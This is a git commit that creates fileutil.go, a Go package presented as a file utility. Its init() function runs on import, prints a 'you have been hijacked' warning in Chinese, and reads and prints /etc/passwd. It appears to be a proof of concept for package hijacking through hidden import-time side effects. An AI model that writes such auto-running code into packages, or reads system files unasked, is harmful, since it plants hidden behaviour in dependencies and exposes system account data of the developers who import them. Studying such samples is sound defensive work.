37860b8f0139b714cfe113057fff145e35cb3292
MM0x00 <18328035805@163.com>
2025-05-07 17:53:34 +0800

    Create fileutil.go

---
+++ fileutil.go
@@ -0,0 +1,23 @@
+package fileutil
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+)
+
+func init() {
+	// 当包被导入时，这段代码会自动执行
+	fmt.Println("劫持警告：你被劫持了！")
+	ReadAndPrintFile()
+}
+
+// ReadAndPrintFile reads the content of /etc/passwd and prints it.
+func ReadAndPrintFile() {
+	const filePath = "/etc/passwd"
+	data, err := ioutil.ReadFile(filePath)
+	if err != nil {
+		log.Fatalf("Error reading file: %v", err)
+	}
+	fmt.Println(string(data))
+}
